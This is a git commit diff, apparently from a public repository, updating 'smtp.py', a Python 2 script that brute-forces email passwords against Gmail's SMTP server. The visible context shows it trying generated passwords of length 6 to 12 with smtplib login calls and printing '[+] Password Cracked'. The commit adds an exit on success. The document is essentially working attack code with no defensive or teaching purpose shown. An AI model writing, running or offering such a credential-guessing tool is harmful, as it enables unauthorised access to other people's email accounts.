19c5f781b8e2d36112163679ada745d9d572424b
x0rLS <42499784+x0rLS@users.noreply.github.com>
2018-12-27 20:07:56 +0100

    Update smtp.py

--- smtp.py
+++ smtp.py
@@ -1,6 +1,7 @@
 import itertools 
 import smtplib 
 import time
+import sys
 
 smtpserver = smtplib.SMTP("smtp.gmail.com", 587) 
 smtpserver.ehlo() 
@@ -13,5 +14,6 @@ for n in range(6, 12+1):
          try: 
              smtpserver.login(user, password) 
              print "[+] Password Cracked: %s" % password
+             sys.exit(0)
          except smtplib.SMTPAuthenticationError: 
              print "[!] Password Inccorect: %s" % password
